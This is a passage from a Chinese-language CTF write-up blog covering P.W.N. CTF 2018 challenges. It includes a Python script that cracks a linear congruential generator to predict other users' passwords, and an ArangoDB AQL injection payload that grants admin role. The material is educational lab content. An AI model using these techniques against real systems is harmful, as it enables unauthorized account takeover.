+<p><a href="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" alt="屏幕快照 2018-11-02 下午5.24.28.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">User Number: 34 </div><div class="line">Password: 4391179335210642486020975422279755323 </div><div class="line"></div><div class="line">User Number: 35 </div><div class="line">Password: 10752978387235368639990800431243402580 </div><div class="line"></div><div class="line">User Number: 36 </div><div class="line">Password: 829507054147681073533941628943699170 </div><div class="line"></div><div class="line">User Number: 37 </div><div class="line">Password: 7191306106172407227503766637907346427 </div><div class="line"></div><div class="line">User Number: 38 </div><div class="line">Password: 13553105158197133381473591646870993684</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">import math</div><div class="line">import functools</div><div class="line"></div><div class="line">reduce = functools.reduce</div><div class="line">gcd = math.gcd</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">        return (b, 0, 1)</div><div class="line">    else:</div><div class="line">        g, x, y = egcd(b % a, a)</div><div class="line">        return (g, y - (b // a) * x, x)</div><div class="line"></div><div class="line">def modinv(b, n):</div><div class="line">    g, x, _ = egcd(b, n)</div><div class="line">    if g == 1:</div><div class="line">        return x % n</div><div class="line"></div><div class="line">def crack_unknown_increment(states, modulus, multiplier):</div><div class="line">    increment = (states[1] - states[0]*multiplier) % modulus</div><div class="line">    return modulus, multiplier, increment</div><div class="line"></div><div class="line">def crack_unknown_multiplier(states, modulus):</div><div class="line">    print(&apos;states&apos;, states)</div><div class="line">    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus</div><div class="line">    return crack_unknown_increment(states, modulus, multiplier)</div><div class="line"></div><div class="line">def crack_unknown_modulus(states):</div><div class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</div><div class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</div><div class="line">    modulus = abs(reduce(gcd, zeroes))</div><div class="line">    return crack_unknown_multiplier(states, modulus)</div><div class="line"></div><div class="line">print(crack_unknown_modulus([4391179335210642486020975422279755323, </div><div class="line">    10752978387235368639990800431243402580, 829507054147681073533941628943699170, 7191306106172407227503766637907346427, 13553105158197133381473591646870993684]))</div><div class="line"> </div><div class="line"># m = 1  # the &quot;multiplier&quot;</div><div class="line"># c = 6361799052024726153969825008963647257  # the &quot;increment&quot;</div><div class="line"># n = 16285270385112413720426683811263350667  # the &quot;modulus&quot;</div><div class="line"></div><div class="line">class prng_lcg:</div><div class="line">    m = 1  # the &quot;multiplier&quot;</div><div class="line">    c = 6361799052024726153969825008963647257  # the &quot;increment&quot;</div><div class="line">    n = 16285270385112413720426683811263350667  # the &quot;modulus&quot;</div><div class="line"></div><div class="line">    def __init__(self, seed):</div><div class="line">        self.state = seed  # the &quot;seed&quot;</div><div class="line"></div><div class="line">    def next(self):</div><div class="line">        self.state = (self.state * self.m + self.c) % self.n</div><div class="line">        return self.state</div><div class="line"></div><div class="line">    def prev(self):</div><div class="line">        self.state = (self.state - self.c) % self.n</div><div class="line">        return int(self.state)</div><div class="line"></div><div class="line">#User Number: 46 </div><div class="line">#Password: 15591686419057701451952140284790119739 </div><div class="line"></div><div class="line">gen = prng_lcg(15591686419057701451952140284790119739) </div><div class="line"></div><div class="line">num = 45</div><div class="line">while num &gt; 0:</div><div class="line">    p = gen.prev()</div><div class="line">    print(num, p)</div><div class="line">    if p == 4391179335210642486020975422279755323:</div><div class="line">        print(&apos;sanity check: working&apos;)</div><div class="line">    num -= 1</div><div class="line"></div><div class="line"># 1 =&gt; 6160325624856057770563639672902954513</div></pre></td></tr></table></figure>
+<p>最后登录得到flag<br><a href="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" alt="屏幕快照 2018-11-02 下午5.23.43.png"></a></p>
+<p>PS:关于此处LCG攻击，你可以查看<a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="external">《攻击线性同余生成器(LCG)》</a></p>
+<h1 id="H-pster-Startup"><a href="#H-pster-Startup" class="headerlink" title="H!pster Startup"></a>H!pster Startup</h1><p>主页代码里可以找到后台，所以就不用扫描了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!--  Main navigation  --&gt;</div><div class="line">&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt;</div><div class="line">	&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">	&lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;</div><div class="line">    &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;!-- /Main navigation --&gt;</div></pre></td></tr></table></figure>
+<p>后台测试发现是ArangoDB并且使用pyArango进行驱动程序。源码中存在如下内容，所以需要<code>_id</code>参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">try :</div><div class="line">    collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]</div><div class="line">except KeyError :</div><div class="line">    raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i)</div></pre></td></tr></table></figure>
+<p>最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; //</div></pre></td></tr></table></figure></p>
+<p>flag为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</div></pre></td></tr></table></figure>
+<p>此处我在写note的时候，官方的题目已经关闭了，所以列出一些参考:</p>
+<p><a href="https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-hpster-startup-write-up-web216/" target="_blank" rel="external">[P.W.N. CTF 2018] H!pster Startup Write-up (Web216)</a></p>
+<p><a href="https://0day.work/p-w-n-university-web-200-h-pster-startup-writeup/" target="_blank" rel="external">P.W.N University: web 200 - H!pster Startup writeup</a></p>
+<p><a href="https://xz.aliyun.com/t/3096#toc-5" target="_blank" rel="external">《P.W.N. CTF web题解》</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/About/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Proyectos</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Sec"><span class="toc-number">1.</span> <span class="toc-text">Login Sec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Converter"><span class="toc-number">2.</span> <span class="toc-text">Converter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCG-and-the-X"><span class="toc-number">3.</span> <span class="toc-text">LCG and the X</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H-pster-Startup"><span class="toc-number">4.</span> <span class="toc-text">H!pster Startup</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&text=P.W.N. CTF Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&is_video=false&description=P.W.N. CTF Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=P.W.N. CTF Writeup&body=Check out this article: http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&name=P.W.N. CTF Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/About/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Proyectos</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
